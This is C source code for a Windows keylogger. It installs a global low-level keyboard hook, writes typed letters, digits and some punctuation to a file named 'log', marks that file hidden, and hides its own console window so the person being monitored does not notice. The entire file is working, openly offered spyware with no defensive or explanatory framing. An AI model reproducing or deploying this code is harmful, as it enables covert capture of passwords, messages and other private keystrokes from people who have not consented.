#include <stdio.h>
#include <time.h>

#include "keylogger.h"

// Initialize empty hook
HHOOK hook = NULL;
// Tracks amount of characters per line
int charCount = 0;

// Keylogging hook that logs low level keystrokes
LRESULT KeylogProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    FILE *f;
    f = fopen("log", "a+");

	if (nCode < 0)
    {
        CallNextHookEx(hook, nCode, wparam, lparam);
    }

	KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*) lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
	{
        // Logs alphanumeric keys
        if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A)
        {
            char c = (char) kb->vkCode;
            fprintf(f, "%c", c);
        }
        // Logs other common keys
        else
        {
            switch (kb->vkCode)
            {
                case VK_RETURN:
                    fprintf(f, "\n");
                    // Reset character counter when user enters new line
                    charCount = 0;
                    break;
                case VK_SPACE:
                    fprintf(f, " ");
                    break;
                case VK_OEM_PERIOD:
                    fprintf(f, ".");
                    break;
                case VK_OEM_COMMA:
                    fprintf(f, ",");
                    break;
                case VK_OEM_7:
                    fprintf(f, "'");
                    break;
                default:
                    fprintf(f, "");
                    break;
            };
        }
        // Creates a new line if more than 80 characters entered
        charCount++;
        if (charCount > 80)
        {
            fprintf(f, "\n");
            charCount = 0;
        }
	}

    fclose(f);

	return CallNextHookEx(hook, nCode, wparam, lparam);
}

// Sets the keylogging hook
int setupHook()
{
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) KeylogProc, GetModuleHandle(NULL), 0);
	return hook == NULL;
}

// Removes the keylogging hook
int removeHook()
{
	int unhook_status = UnhookWindowsHookEx(hook);
	hook = NULL;
	return unhook_status;
}

// Opens log file for appending, inserts timestamp, and hides the file
void initLogFile()
{
    FILE *f;
    f = fopen("log", "a+");

    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    fprintf(f, "\n\nCurrent Time: %d-%d-%d %d:%d:%d\n", tm.tm_year + 1900, tm.tm_mon + 1,tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);

    DWORD attributes = GetFileAttributes("log");
    SetFileAttributes("log", attributes + FILE_ATTRIBUTE_HIDDEN);

    fclose(f);
}

int main()
{
    // Hides console window
    ShowWindow(GetConsoleWindow(), 0);
    
    // Initializes log file
    initLogFile();
    
    // Sets up the keylogging hook
    if (setupHook() != 0)
    {
        printf("Error setting hook.\n\n");
        return -1;
    }
    
    MSG msg;
    
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Removes the keylogging hook
    if (removeHook() != 0)
    {
        printf("Error removing hook.\n\n");
        return -1;
    }

	return 0;
}